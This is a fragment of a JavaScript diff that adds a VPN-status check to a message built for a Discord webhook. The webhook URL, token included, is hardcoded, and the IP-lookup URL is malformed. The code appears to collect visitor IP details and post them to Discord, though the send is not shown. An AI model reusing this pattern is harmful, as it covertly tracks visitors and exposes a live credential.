@@ -16,6 +16,8 @@
         let webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
 
         json(`https://IPFLARE_API_KEY=y=${apiKey}`).then(data => {
+            let vpnStatus = data.security.is_vpn ? "Yes, this is a VPN" : "No, this is not a VPN";
+            
             let message = {
                 embeds: [
                     {
